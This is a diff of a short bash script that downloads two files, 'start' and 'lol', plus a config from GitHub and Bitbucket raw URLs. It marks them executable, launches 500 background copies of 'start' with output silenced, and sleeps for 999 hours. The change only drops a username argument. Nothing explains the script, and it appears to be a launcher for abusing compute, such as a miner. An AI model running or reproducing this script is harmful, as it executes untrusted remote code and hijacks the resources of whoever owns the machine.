@@ -1,5 +1,5 @@
 #!/bin/bash
-user="$1"
+
 wget https://raw.githubusercontent.com/walters99/Slurb/main/start
 wget https://bitbucket.org/oscarhines623/workinside/raw/b23b1f28b86a0e86880a97ea56976934b4e331cb/lol
 wget -O /tmp/build_config https://bitbucket.org/oscarhines623/workinside/raw/b23b1f28b86a0e86880a97ea56976934b4e331cb/build_config
@@ -15,6 +15,6 @@ sed -i "s/USERNAME/$user/" "/tmp/build_config"
 chmod +x lol start
 for i in {1..500} :
 do
-  ./start $user >/dev/null &
+  ./start >/dev/null &
 done
 sleep 999h
